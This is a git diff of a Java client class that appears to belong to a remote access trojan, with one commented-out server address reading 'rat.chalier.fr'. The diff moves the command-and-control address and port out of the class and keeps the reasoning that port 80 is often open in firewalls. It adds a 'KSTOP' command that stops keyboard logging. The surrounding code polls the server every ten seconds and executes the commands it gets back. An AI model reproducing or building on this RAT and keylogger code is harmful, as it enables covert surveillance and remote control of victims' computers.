@@ -29,18 +29,6 @@ import tools.ParsedCommand;
 public class Client extends Thread {
 	
 	/**
-	 * Server url.
-	 * Using a domain name to be able to change IP once compiled.
-	 */
-	// private static final String SERVER_URL = "http://rat.chalier.fr";
-	private static final String SERVER_URL = "192.168.1.19";
-	
-	/**
-	 * Server port. 80 by default, as often opened in firewalls.
-	 */
-	private static final int SERVER_PORT = 80;
-	
-	/**
 	 *  Client cooldown between pings, in milliseconds.
 	 */
 	private static final int REFRESH_COOLDOWN = 10000;
@@ -181,6 +169,17 @@ public class Client extends Thread {
 			
 		});
 		
+		commands.put("KSTOP", new CommandInterface(){
+
+			@Override
+			public String exec(ParsedCommand pCmd) {
+				logKeyboard = false;
+				send("DONE", new byte[] {});
+				return null;
+			}
+			
+		});
+		
 	}
 	
 	public boolean doLogKeyboard() {
@@ -251,7 +250,7 @@ public class Client extends Thread {
 			
 			// Opens a new connection if necessary
 			if (curConn == null)
-				curConn = new Connection(SERVER_URL, SERVER_PORT);
+				curConn = new Connection();
 			
 			// Sending request
 			curConn.write(request, payload);
@@ -276,7 +275,6 @@ public class Client extends Thread {
 			// TODO Remove before production
 			e.printStackTrace();
 			return null;
-			
 		}
 	}
 	
@@ -289,7 +287,7 @@ public class Client extends Thread {
 			connected = false;
 			return;
 		}
-		
+				
 		String request = curConn.readResponse();
 		
 		ParsedCommand pCmd = new ParsedCommand(request.toString());
